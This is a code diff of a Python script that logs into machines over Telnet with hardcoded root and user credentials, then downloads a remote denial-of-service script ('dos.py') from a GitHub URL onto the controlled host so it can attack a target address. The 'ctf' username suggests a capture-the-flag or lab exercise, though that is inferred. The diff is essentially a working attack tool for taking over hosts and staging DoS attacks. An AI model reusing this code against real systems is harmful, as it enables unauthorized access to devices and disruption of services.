@@ -5,8 +5,9 @@ class Trigger(object):
     def __init__(self):
         pass
 
-    def login(self,Host,username=b'root',passwd=b'root'):
-        dev = telnetlib.Telnet(Host,port=23)
+    #def login(self,Host,username=b'root',passwd=b'root'):
+    def login(self,Host_attack,username=b'root',passwd=b'tee001'):
+        dev = telnetlib.Telnet(Host_attack,port=23)
         dev.set_debuglevel(2) #Debug mode
 
         dev.read_until(b'login:')
@@ -42,12 +43,14 @@ class Trigger(object):
         telnetlib.Telnet.close(dev)
 
 if __name__ == '__main__':
-    Host=b'192.168.59.146'
-    username = b'gu'
-    passwd = b'gu'
-    path = b'https://raw.githubusercontent.com/isGt93/isGt93.github.io/source/source/_posts/%E9%BB%91%E5%AE%A2%E7%AC%94%E8%AE%B0-DDOS%E5%85%A5%E9%97%A8/dos.py'
+    #Host=b'192.168.59.146'
+    Host_ctrled=b'153.0.0.181'
+    Host_attack=b'153.0.0.171'
+    username = b'ctf'
+    passwd = b'test1234'
+    path = b'https://github.com/bl201809/bllist/tree/master/20180907/dos.py'
     hack = Trigger()
-    dev = hack.login(Host,username,passwd)
+    dev = hack.login(Host_ctrled,username,passwd)
     if not hack.checkIN(dev):
         hack.dosDownLoad(dev,path)
     time.sleep(2)
